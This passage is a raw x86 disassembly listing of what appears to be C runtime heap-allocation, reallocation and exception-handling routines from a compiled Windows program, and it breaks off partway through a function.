  4251b9:	mov    DWORD PTR [eax],edx
  4251bb:	lea    edx,[eax-0x1004]
  4251c1:	mov    DWORD PTR [eax-0x4],0xff0
  4251c8:	mov    DWORD PTR [eax+0x4],edx
  4251cb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251d5:	add    eax,0x1000
  4251da:	dec    ecx
  4251db:	jne    0x4251a8
  4251dd:	mov    edx,DWORD PTR [ebp-0x4]
  4251e0:	mov    eax,DWORD PTR [ebp-0x8]
  4251e3:	add    eax,0x1f8
  4251e8:	lea    ecx,[edi+0xc]
  4251eb:	mov    DWORD PTR [eax+0x4],ecx
  4251ee:	mov    DWORD PTR [ecx+0x8],eax
  4251f1:	lea    ecx,[edx+0xc]
  4251f4:	mov    DWORD PTR [eax+0x8],ecx
  4251f7:	mov    DWORD PTR [ecx+0x4],eax
  4251fa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ff:	xor    edi,edi
  425201:	inc    edi
  425202:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425209:	mov    al,BYTE PTR [esi+0x43]
  42520c:	mov    cl,al
  42520e:	inc    cl
  425210:	test   al,al
  425212:	mov    eax,DWORD PTR [ebp+0x8]
  425215:	mov    BYTE PTR [esi+0x43],cl
  425218:	jne    0x42521d
  42521a:	or     DWORD PTR [eax+0x4],edi
  42521d:	mov    edx,0x80000000
  425222:	mov    ecx,ebx
  425224:	shr    edx,cl
  425226:	not    edx
  425228:	and    DWORD PTR [eax+0x8],edx
  42522b:	mov    eax,ebx
  42522d:	pop    edi
  42522e:	pop    esi
  42522f:	pop    ebx
  425230:	leave  
  425231:	ret    
  425232:	push   ebp
  425233:	mov    ebp,esp
  425235:	sub    esp,0xc
  425238:	mov    ecx,DWORD PTR [ebp+0x8]
  42523b:	mov    eax,DWORD PTR [ecx+0x10]
  42523e:	push   ebx
  42523f:	push   esi
  425240:	mov    esi,DWORD PTR [ebp+0x10]
  425243:	push   edi
  425244:	mov    edi,DWORD PTR [ebp+0xc]
  425247:	mov    edx,edi
  425249:	sub    edx,DWORD PTR [ecx+0xc]
  42524c:	add    esi,0x17
  42524f:	shr    edx,0xf
  425252:	mov    ecx,edx
  425254:	imul   ecx,ecx,0x204
  42525a:	lea    ecx,[ecx+eax*1+0x144]
  425261:	mov    DWORD PTR [ebp-0xc],ecx
  425264:	mov    ecx,DWORD PTR [edi-0x4]
  425267:	and    esi,0xfffffff0
  42526a:	dec    ecx
  42526b:	cmp    esi,ecx
  42526d:	lea    edi,[ecx+edi*1-0x4]
  425271:	mov    ebx,DWORD PTR [edi]
  425273:	mov    DWORD PTR [ebp+0x10],ecx
  425276:	mov    DWORD PTR [ebp-0x4],ebx
  425279:	jle    0x4253d4
  42527f:	test   bl,0x1
  425282:	jne    0x4253cd
  425288:	add    ebx,ecx
  42528a:	cmp    esi,ebx
  42528c:	jg     0x4253cd
  425292:	mov    ecx,DWORD PTR [ebp-0x4]
  425295:	sar    ecx,0x4
  425298:	dec    ecx
  425299:	cmp    ecx,0x3f
  42529c:	mov    DWORD PTR [ebp-0x8],ecx
  42529f:	jbe    0x4252a7
  4252a1:	push   0x3f
  4252a3:	pop    ecx
  4252a4:	mov    DWORD PTR [ebp-0x8],ecx
  4252a7:	mov    ebx,DWORD PTR [edi+0x4]
  4252aa:	cmp    ebx,DWORD PTR [edi+0x8]
  4252ad:	jne    0x4252f2
  4252af:	cmp    ecx,0x20
  4252b2:	mov    ebx,0x80000000
  4252b7:	jae    0x4252d3
  4252b9:	shr    ebx,cl
  4252bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4252be:	lea    ecx,[ecx+eax*1+0x4]
  4252c2:	not    ebx
  4252c4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252c8:	dec    BYTE PTR [ecx]
  4252ca:	jne    0x4252f2
  4252cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252cf:	and    DWORD PTR [ecx],ebx
  4252d1:	jmp    0x4252f2
  4252d3:	add    ecx,0xffffffe0
  4252d6:	shr    ebx,cl
  4252d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252db:	lea    ecx,[ecx+eax*1+0x4]
  4252df:	not    ebx
  4252e1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252e8:	dec    BYTE PTR [ecx]
  4252ea:	jne    0x4252f2
  4252ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4252ef:	and    DWORD PTR [ecx+0x4],ebx
  4252f2:	mov    ecx,DWORD PTR [edi+0x8]
  4252f5:	mov    ebx,DWORD PTR [edi+0x4]
  4252f8:	mov    DWORD PTR [ecx+0x4],ebx
  4252fb:	mov    ecx,DWORD PTR [edi+0x4]
  4252fe:	mov    edi,DWORD PTR [edi+0x8]
  425301:	mov    DWORD PTR [ecx+0x8],edi
  425304:	mov    ecx,DWORD PTR [ebp+0x10]
  425307:	sub    ecx,esi
  425309:	add    DWORD PTR [ebp-0x4],ecx
  42530c:	cmp    DWORD PTR [ebp-0x4],0x0
  425310:	jle    0x4253bb
  425316:	mov    edi,DWORD PTR [ebp-0x4]
  425319:	mov    ecx,DWORD PTR [ebp+0xc]
  42531c:	sar    edi,0x4
  42531f:	dec    edi
  425320:	cmp    edi,0x3f
  425323:	lea    ecx,[ecx+esi*1-0x4]
  425327:	jbe    0x42532c
  425329:	push   0x3f
  42532b:	pop    edi
  42532c:	mov    ebx,DWORD PTR [ebp-0xc]
  42532f:	lea    ebx,[ebx+edi*8]
  425332:	mov    DWORD PTR [ebp+0x10],ebx
  425335:	mov    ebx,DWORD PTR [ebx+0x4]
  425338:	mov    DWORD PTR [ecx+0x4],ebx
  42533b:	mov    ebx,DWORD PTR [ebp+0x10]
  42533e:	mov    DWORD PTR [ecx+0x8],ebx
  425341:	mov    DWORD PTR [ebx+0x4],ecx
  425344:	mov    ebx,DWORD PTR [ecx+0x4]
  425347:	mov    DWORD PTR [ebx+0x8],ecx
  42534a:	mov    ebx,DWORD PTR [ecx+0x4]
  42534d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425350:	jne    0x4253a9
  425352:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425356:	mov    BYTE PTR [ebp+0x13],cl
  425359:	inc    cl
  42535b:	cmp    edi,0x20
  42535e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425362:	jae    0x425380
  425364:	cmp    BYTE PTR [ebp+0x13],0x0
  425368:	jne    0x425378
  42536a:	mov    ecx,edi
  42536c:	mov    ebx,0x80000000
  425371:	shr    ebx,cl
  425373:	mov    ecx,DWORD PTR [ebp+0x8]
  425376:	or     DWORD PTR [ecx],ebx
  425378:	lea    eax,[eax+edx*4+0x44]
  42537c:	mov    ecx,edi
  42537e:	jmp    0x4253a0
  425380:	cmp    BYTE PTR [ebp+0x13],0x0
  425384:	jne    0x425396
  425386:	lea    ecx,[edi-0x20]
  425389:	mov    ebx,0x80000000
  42538e:	shr    ebx,cl
  425390:	mov    ecx,DWORD PTR [ebp+0x8]
  425393:	or     DWORD PTR [ecx+0x4],ebx
  425396:	lea    eax,[eax+edx*4+0xc4]
  42539d:	lea    ecx,[edi-0x20]
  4253a0:	mov    edx,0x80000000
  4253a5:	shr    edx,cl
  4253a7:	or     DWORD PTR [eax],edx
  4253a9:	mov    edx,DWORD PTR [ebp+0xc]
  4253ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4253af:	lea    eax,[edx+esi*1-0x4]
  4253b3:	mov    DWORD PTR [eax],ecx
  4253b5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253b9:	jmp    0x4253be
  4253bb:	mov    edx,DWORD PTR [ebp+0xc]
  4253be:	lea    eax,[esi+0x1]
  4253c1:	mov    DWORD PTR [edx-0x4],eax
  4253c4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253c8:	jmp    0x425509
  4253cd:	xor    eax,eax
  4253cf:	jmp    0x42550c
  4253d4:	jge    0x425509
  4253da:	mov    ebx,DWORD PTR [ebp+0xc]
  4253dd:	sub    DWORD PTR [ebp+0x10],esi
  4253e0:	lea    ecx,[esi+0x1]
  4253e3:	mov    DWORD PTR [ebx-0x4],ecx
  4253e6:	lea    ebx,[ebx+esi*1-0x4]
  4253ea:	mov    esi,DWORD PTR [ebp+0x10]
  4253ed:	sar    esi,0x4
  4253f0:	dec    esi
  4253f1:	cmp    esi,0x3f
  4253f4:	mov    DWORD PTR [ebp+0xc],ebx
  4253f7:	mov    DWORD PTR [ebx-0x4],ecx
  4253fa:	jbe    0x4253ff
  4253fc:	push   0x3f
  4253fe:	pop    esi
  4253ff:	test   BYTE PTR [ebp-0x4],0x1
  425403:	jne    0x425489
  425409:	mov    esi,DWORD PTR [ebp-0x4]
  42540c:	sar    esi,0x4
  42540f:	dec    esi
  425410:	cmp    esi,0x3f
  425413:	jbe    0x425418
  425415:	push   0x3f
  425417:	pop    esi
  425418:	mov    ecx,DWORD PTR [edi+0x4]
  42541b:	cmp    ecx,DWORD PTR [edi+0x8]
  42541e:	jne    0x425462
  425420:	cmp    esi,0x20
  425423:	mov    ebx,0x80000000
  425428:	jae    0x425443
  42542a:	mov    ecx,esi
  42542c:	shr    ebx,cl
  42542e:	lea    esi,[esi+eax*1+0x4]
  425432:	not    ebx
  425434:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425438:	dec    BYTE PTR [esi]
  42543a:	jne    0x42545f
  42543c:	mov    ecx,DWORD PTR [ebp+0x8]
  42543f:	and    DWORD PTR [ecx],ebx
  425441:	jmp    0x42545f
  425443:	lea    ecx,[esi-0x20]
  425446:	shr    ebx,cl
  425448:	lea    ecx,[esi+eax*1+0x4]
  42544c:	not    ebx
  42544e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425455:	dec    BYTE PTR [ecx]
  425457:	jne    0x42545f
  425459:	mov    ecx,DWORD PTR [ebp+0x8]
  42545c:	and    DWORD PTR [ecx+0x4],ebx
  42545f:	mov    ebx,DWORD PTR [ebp+0xc]
  425462:	mov    ecx,DWORD PTR [edi+0x8]
  425465:	mov    esi,DWORD PTR [edi+0x4]
  425468:	mov    DWORD PTR [ecx+0x4],esi
  42546b:	mov    esi,DWORD PTR [edi+0x8]
  42546e:	mov    ecx,DWORD PTR [edi+0x4]
  425471:	mov    DWORD PTR [ecx+0x8],esi
  425474:	mov    esi,DWORD PTR [ebp+0x10]
  425477:	add    esi,DWORD PTR [ebp-0x4]
  42547a:	mov    DWORD PTR [ebp+0x10],esi
  42547d:	sar    esi,0x4
  425480:	dec    esi
  425481:	cmp    esi,0x3f
  425484:	jbe    0x425489
  425486:	push   0x3f
  425488:	pop    esi
  425489:	mov    ecx,DWORD PTR [ebp-0xc]
  42548c:	lea    ecx,[ecx+esi*8]
  42548f:	mov    edi,DWORD PTR [ecx+0x4]
  425492:	mov    DWORD PTR [ebx+0x8],ecx
  425495:	mov    DWORD PTR [ebx+0x4],edi
  425498:	mov    DWORD PTR [ecx+0x4],ebx
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    DWORD PTR [ecx+0x8],ebx
  4254a1:	mov    ecx,DWORD PTR [ebx+0x4]
  4254a4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4254a7:	jne    0x425500
  4254a9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4254ad:	mov    BYTE PTR [ebp+0xf],cl
  4254b0:	inc    cl
  4254b2:	cmp    esi,0x20
  4254b5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254b9:	jae    0x4254d7
  4254bb:	cmp    BYTE PTR [ebp+0xf],0x0
  4254bf:	jne    0x4254cf
  4254c1:	mov    ecx,esi
  4254c3:	mov    edi,0x80000000
  4254c8:	shr    edi,cl
  4254ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4254cd:	or     DWORD PTR [ecx],edi
  4254cf:	lea    eax,[eax+edx*4+0x44]
  4254d3:	mov    ecx,esi
  4254d5:	jmp    0x4254f7
  4254d7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254db:	jne    0x4254ed
  4254dd:	lea    ecx,[esi-0x20]
  4254e0:	mov    edi,0x80000000
  4254e5:	shr    edi,cl
  4254e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ea:	or     DWORD PTR [ecx+0x4],edi
  4254ed:	lea    eax,[eax+edx*4+0xc4]
  4254f4:	lea    ecx,[esi-0x20]
  4254f7:	mov    edx,0x80000000
  4254fc:	shr    edx,cl
  4254fe:	or     DWORD PTR [eax],edx
  425500:	mov    eax,DWORD PTR [ebp+0x10]
  425503:	mov    DWORD PTR [ebx],eax
  425505:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425509:	xor    eax,eax
  42550b:	inc    eax
  42550c:	pop    edi
  42550d:	pop    esi
  42550e:	pop    ebx
  42550f:	leave  
  425510:	ret    
  425511:	push   ebp
  425512:	mov    ebp,esp
  425514:	sub    esp,0x14
  425517:	mov    ecx,DWORD PTR [ebp+0x8]
  42551a:	mov    eax,ds:0x46519c
  42551f:	mov    edx,DWORD PTR ds:0x4651a0
  425525:	add    ecx,0x17
  425528:	and    ecx,0xfffffff0
  42552b:	push   ebx
  42552c:	mov    DWORD PTR [ebp-0x10],ecx
  42552f:	sar    ecx,0x4
  425532:	push   esi
  425533:	lea    eax,[eax+eax*4]
  425536:	push   edi
  425537:	dec    ecx
  425538:	cmp    ecx,0x20
  42553b:	lea    edi,[edx+eax*4]
  42553e:	mov    DWORD PTR [ebp-0x4],edi
  425541:	jge    0x42554e
  425543:	or     esi,0xffffffff
  425546:	shr    esi,cl
  425548:	or     DWORD PTR [ebp-0x8],0xffffffff
  42554c:	jmp    0x42555b
  42554e:	add    ecx,0xffffffe0
  425551:	or     eax,0xffffffff
  425554:	xor    esi,esi
  425556:	shr    eax,cl
  425558:	mov    DWORD PTR [ebp-0x8],eax
  42555b:	mov    eax,ds:0x4651a8
  425560:	mov    ebx,eax
  425562:	mov    DWORD PTR [ebp-0xc],esi
  425565:	cmp    ebx,edi
  425567:	jmp    0x42557d
  425569:	mov    ecx,DWORD PTR [ebx+0x4]
  42556c:	mov    edi,DWORD PTR [ebx]
  42556e:	and    ecx,DWORD PTR [ebp-0x8]
  425571:	and    edi,esi
  425573:	or     ecx,edi
  425575:	jne    0x425582
  425577:	add    ebx,0x14
  42557a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42557d:	mov    DWORD PTR [ebp+0x8],ebx
  425580:	jb     0x425569
  425582:	cmp    ebx,DWORD PTR [ebp-0x4]
  425585:	jne    0x4255ab
  425587:	mov    ebx,edx
  425589:	jmp    0x42559c
  42558b:	mov    ecx,DWORD PTR [ebx+0x4]
  42558e:	mov    edi,DWORD PTR [ebx]
  425590:	and    ecx,DWORD PTR [ebp-0x8]
  425593:	and    edi,esi
  425595:	or     ecx,edi
  425597:	jne    0x4255a3
  425599:	add    ebx,0x14
  42559c:	cmp    ebx,eax
  42559e:	mov    DWORD PTR [ebp+0x8],ebx
  4255a1:	jb     0x42558b
  4255a3:	cmp    ebx,eax
  4255a5:	je     0x42563f
  4255ab:	mov    DWORD PTR ds:0x4651a8,ebx
  4255b1:	mov    eax,DWORD PTR [ebx+0x10]
  4255b4:	mov    edx,DWORD PTR [eax]
  4255b6:	cmp    edx,0xffffffff
  4255b9:	mov    DWORD PTR [ebp-0x4],edx
  4255bc:	je     0x4255d2
  4255be:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255c5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255c9:	and    ecx,DWORD PTR [ebp-0x8]
  4255cc:	and    edi,esi
  4255ce:	or     ecx,edi
  4255d0:	jne    0x425608
  4255d2:	mov    edx,DWORD PTR [eax+0xc4]
  4255d8:	and    edx,DWORD PTR [ebp-0x8]
  4255db:	and    DWORD PTR [ebp-0x4],0x0
  4255df:	lea    ecx,[eax+0x44]
  4255e2:	mov    esi,DWORD PTR [ecx]
  4255e4:	and    esi,DWORD PTR [ebp-0xc]
  4255e7:	or     edx,esi
  4255e9:	mov    esi,DWORD PTR [ebp-0xc]
  4255ec:	jne    0x425605
  4255ee:	mov    edx,DWORD PTR [ecx+0x84]
  4255f4:	and    edx,DWORD PTR [ebp-0x8]
  4255f7:	inc    DWORD PTR [ebp-0x4]
  4255fa:	add    ecx,0x4
  4255fd:	mov    edi,DWORD PTR [ecx]
  4255ff:	and    edi,esi
  425601:	or     edx,edi
  425603:	je     0x4255ee
  425605:	mov    edx,DWORD PTR [ebp-0x4]
  425608:	mov    ecx,edx
  42560a:	imul   ecx,ecx,0x204
  425610:	lea    ecx,[ecx+eax*1+0x144]
  425617:	mov    DWORD PTR [ebp-0xc],ecx
  42561a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42561e:	xor    edi,edi
  425620:	and    ecx,esi
  425622:	jne    0x425691
  425624:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42562b:	and    ecx,DWORD PTR [ebp-0x8]
  42562e:	push   0x20
  425630:	pop    edi
  425631:	jmp    0x425691
  425633:	cmp    DWORD PTR [ebx+0x8],0x0
  425637:	jne    0x425644
  425639:	add    ebx,0x14
  42563c:	mov    DWORD PTR [ebp+0x8],ebx
  42563f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425642:	jb     0x425633
  425644:	cmp    ebx,DWORD PTR [ebp-0x4]
  425647:	jne    0x42566f
  425649:	mov    ebx,edx
  42564b:	jmp    0x425656
  42564d:	cmp    DWORD PTR [ebx+0x8],0x0
  425651:	jne    0x42565d
  425653:	add    ebx,0x14
  425656:	cmp    ebx,eax
  425658:	mov    DWORD PTR [ebp+0x8],ebx
  42565b:	jb     0x42564d
  42565d:	cmp    ebx,eax
  42565f:	jne    0x42566f
  425661:	call   0x425075
  425666:	mov    ebx,eax
  425668:	test   ebx,ebx
  42566a:	mov    DWORD PTR [ebp+0x8],ebx
  42566d:	je     0x425687
  42566f:	push   ebx
  425670:	call   0x42512c
  425675:	pop    ecx
  425676:	mov    ecx,DWORD PTR [ebx+0x10]
  425679:	mov    DWORD PTR [ecx],eax
  42567b:	mov    eax,DWORD PTR [ebx+0x10]
  42567e:	cmp    DWORD PTR [eax],0xffffffff
  425681:	jne    0x4255ab
  425687:	xor    eax,eax
  425689:	jmp    0x425808
  42568e:	shl    ecx,1
  425690:	inc    edi
  425691:	test   ecx,ecx
  425693:	jge    0x42568e
  425695:	mov    ecx,DWORD PTR [ebp-0xc]
  425698:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42569c:	mov    ecx,DWORD PTR [edx]
  42569e:	sub    ecx,DWORD PTR [ebp-0x10]
  4256a1:	mov    esi,ecx
  4256a3:	sar    esi,0x4
  4256a6:	dec    esi
  4256a7:	cmp    esi,0x3f
  4256aa:	mov    DWORD PTR [ebp-0x8],ecx
  4256ad:	jle    0x4256b2
  4256af:	push   0x3f
  4256b1:	pop    esi
  4256b2:	cmp    esi,edi
  4256b4:	je     0x4257bb
  4256ba:	mov    ecx,DWORD PTR [edx+0x4]
  4256bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4256c0:	jne    0x42571e
  4256c2:	cmp    edi,0x20
  4256c5:	mov    ebx,0x80000000
  4256ca:	jge    0x4256f2
  4256cc:	mov    ecx,edi
  4256ce:	shr    ebx,cl
  4256d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256d3:	lea    edi,[eax+edi*1+0x4]
  4256d7:	not    ebx
  4256d9:	mov    DWORD PTR [ebp-0x14],ebx
  4256dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256e4:	dec    BYTE PTR [edi]
  4256e6:	jne    0x42571b
  4256e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256ee:	and    DWORD PTR [ebx],ecx
  4256f0:	jmp    0x42571e
  4256f2:	lea    ecx,[edi-0x20]
  4256f5:	shr    ebx,cl
  4256f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256fa:	lea    ecx,[eax+ecx*4+0xc4]
  425701:	lea    edi,[eax+edi*1+0x4]
  425705:	not    ebx
  425707:	and    DWORD PTR [ecx],ebx
  425709:	dec    BYTE PTR [edi]
  42570b:	mov    DWORD PTR [ebp-0x14],ebx
  42570e:	jne    0x42571b
  425710:	mov    ebx,DWORD PTR [ebp+0x8]
  425713:	mov    ecx,DWORD PTR [ebp-0x14]
  425716:	and    DWORD PTR [ebx+0x4],ecx
  425719:	jmp    0x42571e
  42571b:	mov    ebx,DWORD PTR [ebp+0x8]
  42571e:	cmp    DWORD PTR [ebp-0x8],0x0
  425722:	mov    ecx,DWORD PTR [edx+0x8]
  425725:	mov    edi,DWORD PTR [edx+0x4]
  425728:	mov    DWORD PTR [ecx+0x4],edi
  42572b:	mov    ecx,DWORD PTR [edx+0x4]
  42572e:	mov    edi,DWORD PTR [edx+0x8]
  425731:	mov    DWORD PTR [ecx+0x8],edi
  425734:	je     0x4257c7
  42573a:	mov    ecx,DWORD PTR [ebp-0xc]
  42573d:	lea    ecx,[ecx+esi*8]
  425740:	mov    edi,DWORD PTR [ecx+0x4]
  425743:	mov    DWORD PTR [edx+0x8],ecx
  425746:	mov    DWORD PTR [edx+0x4],edi
  425749:	mov    DWORD PTR [ecx+0x4],edx
  42574c:	mov    ecx,DWORD PTR [edx+0x4]
  42574f:	mov    DWORD PTR [ecx+0x8],edx
  425752:	mov    ecx,DWORD PTR [edx+0x4]
  425755:	cmp    ecx,DWORD PTR [edx+0x8]
  425758:	jne    0x4257b8
  42575a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42575e:	mov    BYTE PTR [ebp+0xb],cl
  425761:	inc    cl
  425763:	cmp    esi,0x20
  425766:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42576a:	jge    0x42578f
  42576c:	cmp    BYTE PTR [ebp+0xb],0x0
  425770:	jne    0x42577d
  425772:	mov    edi,0x80000000
  425777:	mov    ecx,esi
  425779:	shr    edi,cl
  42577b:	or     DWORD PTR [ebx],edi
  42577d:	mov    ecx,esi
  42577f:	mov    edi,0x80000000
  425784:	shr    edi,cl
  425786:	mov    ecx,DWORD PTR [ebp-0x4]
  425789:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42578d:	jmp    0x4257b8
  42578f:	cmp    BYTE PTR [ebp+0xb],0x0
  425793:	jne    0x4257a2
  425795:	lea    ecx,[esi-0x20]
  425798:	mov    edi,0x80000000
  42579d:	shr    edi,cl
  42579f:	or     DWORD PTR [ebx+0x4],edi
  4257a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a5:	lea    edi,[eax+ecx*4+0xc4]
  4257ac:	lea    ecx,[esi-0x20]
  4257af:	mov    esi,0x80000000
  4257b4:	shr    esi,cl
  4257b6:	or     DWORD PTR [edi],esi
  4257b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257bb:	test   ecx,ecx
  4257bd:	je     0x4257ca
  4257bf:	mov    DWORD PTR [edx],ecx
  4257c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257c5:	jmp    0x4257ca
  4257c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ca:	mov    esi,DWORD PTR [ebp-0x10]
  4257cd:	add    edx,ecx
  4257cf:	lea    ecx,[esi+0x1]
  4257d2:	mov    DWORD PTR [edx],ecx
  4257d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257d8:	mov    esi,DWORD PTR [ebp-0xc]
  4257db:	mov    ecx,DWORD PTR [esi]
  4257dd:	test   ecx,ecx
  4257df:	lea    edi,[ecx+0x1]
  4257e2:	mov    DWORD PTR [esi],edi
  4257e4:	jne    0x425800
  4257e6:	cmp    ebx,DWORD PTR ds:0x465198
  4257ec:	jne    0x425800
  4257ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f1:	cmp    ecx,DWORD PTR ds:0x4651b0
  4257f7:	jne    0x425800
  4257f9:	and    DWORD PTR ds:0x465198,0x0
  425800:	mov    ecx,DWORD PTR [ebp-0x4]
  425803:	mov    DWORD PTR [eax],ecx
  425805:	lea    eax,[edx+0x4]
  425808:	pop    edi
  425809:	pop    esi
  42580a:	pop    ebx
  42580b:	leave  
  42580c:	ret    
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   esi
  425811:	inc    ebx
  425812:	xor    dh,BYTE PTR [eax]
  425814:	pop    eax
  425815:	inc    ebx
  425816:	xor    BYTE PTR [eax],dh
  425818:	push   ebp
  425819:	mov    ebp,esp
  42581b:	sub    esp,0x8
  42581e:	push   ebx
  42581f:	push   esi
  425820:	push   edi
  425821:	push   ebp
  425822:	cld    
  425823:	mov    ebx,DWORD PTR [ebp+0xc]
  425826:	mov    eax,DWORD PTR [ebp+0x8]
  425829:	test   DWORD PTR [eax+0x4],0x6
  425830:	jne    0x4258b8
  425836:	mov    DWORD PTR [ebp-0x8],eax
  425839:	mov    eax,DWORD PTR [ebp+0x10]
  42583c:	mov    DWORD PTR [ebp-0x4],eax
  42583f:	lea    eax,[ebp-0x8]
  425842:	mov    DWORD PTR [ebx-0x4],eax
  425845:	mov    esi,DWORD PTR [ebx+0xc]
  425848:	mov    edi,DWORD PTR [ebx+0x8]
  42584b:	cmp    esi,0xffffffff
  42584e:	je     0x4258b1
  425850:	lea    ecx,[esi+esi*2]
  425853:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425858:	je     0x42589f
  42585a:	push   esi
  42585b:	push   ebp
  42585c:	lea    ebp,[ebx+0x10]
  42585f:	call   DWORD PTR [edi+ecx*4+0x4]
  425863:	pop    ebp
  425864:	pop    esi
  425865:	mov    ebx,DWORD PTR [ebp+0xc]
  425868:	or     eax,eax
  42586a:	je     0x42589f
  42586c:	js     0x4258aa
  42586e:	mov    edi,DWORD PTR [ebx+0x8]
  425871:	push   ebx
  425872:	call   0x4267a0
  425877:	add    esp,0x4
  42587a:	lea    ebp,[ebx+0x10]
  42587d:	push   esi
  42587e:	push   ebx
  42587f:	call   0x4267e2
  425884:	add    esp,0x8
  425887:	lea    ecx,[esi+esi*2]
  42588a:	push   0x1
  42588c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425890:	call   0x426876
  425895:	mov    eax,DWORD PTR [edi+ecx*4]
  425898:	mov    DWORD PTR [ebx+0xc],eax
  42589b:	call   DWORD PTR [edi+ecx*4+0x8]
  42589f:	mov    edi,DWORD PTR [ebx+0x8]
  4258a2:	lea    ecx,[esi+esi*2]
  4258a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4258a8:	jmp    0x42584b
  4258aa:	mov    eax,0x0
  4258af:	jmp    0x4258cd
  4258b1:	mov    eax,0x1
  4258b6:	jmp    0x4258cd
  4258b8:	push   ebp
  4258b9:	lea    ebp,[ebx+0x10]
  4258bc:	push   0xffffffff
  4258be:	push   ebx
  4258bf:	call   0x4267e2
  4258c4:	add    esp,0x8
  4258c7:	pop    ebp
  4258c8:	mov    eax,0x1
  4258cd:	pop    ebp
  4258ce:	pop    edi
  4258cf:	pop    esi
  4258d0:	pop    ebx
  4258d1:	mov    esp,ebp
  4258d3:	pop    ebp
  4258d4:	ret    
  4258d5:	push   ebp
  4258d6:	mov    ecx,DWORD PTR [esp+0x8]
  4258da:	mov    ebp,DWORD PTR [ecx]
  4258dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258df:	push   eax
  4258e0:	mov    eax,DWORD PTR [ecx+0x18]
  4258e3:	push   eax
  4258e4:	call   0x4267e2
  4258e9:	add    esp,0x8
  4258ec:	pop    ebp
  4258ed:	ret    0x4
  4258f0:	call   0x423803
  4258f5:	add    eax,0x8
  4258f8:	ret    
  4258f9:	push   0x14
  4258fb:	push   0x4287c0
  425900:	call   0x423950
  425905:	mov    edi,DWORD PTR [ebp+0x8]
  425908:	xor    ebx,ebx
  42590a:	cmp    edi,ebx
  42590c:	jne    0x42591c
  42590e:	push   DWORD PTR [ebp+0xc]
  425911:	call   0x424672
  425916:	pop    ecx
  425917:	jmp    0x425aa0
  42591c:	mov    esi,DWORD PTR [ebp+0xc]
  42591f:	cmp    esi,ebx
  425921:	jne    0x42592f
  425923:	push   edi
  425924:	call   0x42455a
  425929:	pop    ecx
  42592a:	jmp    0x425a9e
  42592f:	cmp    DWORD PTR ds:0x4653e4,0x3
  425936:	jne    0x425a6a
  42593c:	mov    DWORD PTR [ebp-0x1c],ebx
  42593f:	cmp    esi,0xffffffe0
  425942:	ja     0x425a39
  425948:	push   0x4
  42594a:	call   0x423b0f
  42594f:	pop    ecx
  425950:	mov    DWORD PTR [ebp-0x4],ebx
  425953:	push   edi
  425954:	call   0x424d32
  425959:	pop    ecx
  42595a:	mov    DWORD PTR [ebp-0x20],eax
  42595d:	cmp    eax,ebx
  42595f:	je     0x425a09
  425965:	cmp    esi,DWORD PTR ds:0x4651a4
  42596b:	ja     0x4259b9
  42596d:	push   esi
  42596e:	push   edi
  42596f:	push   eax
  425970:	call   0x425232
  425975:	add    esp,0xc
  425978:	test   eax,eax
  42597a:	je     0x425981
  42597c:	mov    DWORD PTR [ebp-0x1c],edi
  42597f:	jmp    0x4259b9
  425981:	push   esi
  425982:	call   0x425511
  425987:	pop    ecx
  425988:	mov    DWORD PTR [ebp-0x1c],eax
  42598b:	cmp    eax,ebx
  42598d:	je     0x4259b9
  42598f:	mov    eax,DWORD PTR [edi-0x4]
  425992:	dec    eax
  425993:	mov    DWORD PTR [ebp-0x24],eax
  425996:	cmp    eax,esi
  425998:	jb     0x42599c
  42599a:	mov    eax,esi
  42599c:	push   eax
  42599d:	push   edi
  42599e:	push   DWORD PTR [ebp-0x1c]
  4259a1:	call   0x424690
  4259a6:	push   edi
  4259a7:	call   0x424d32
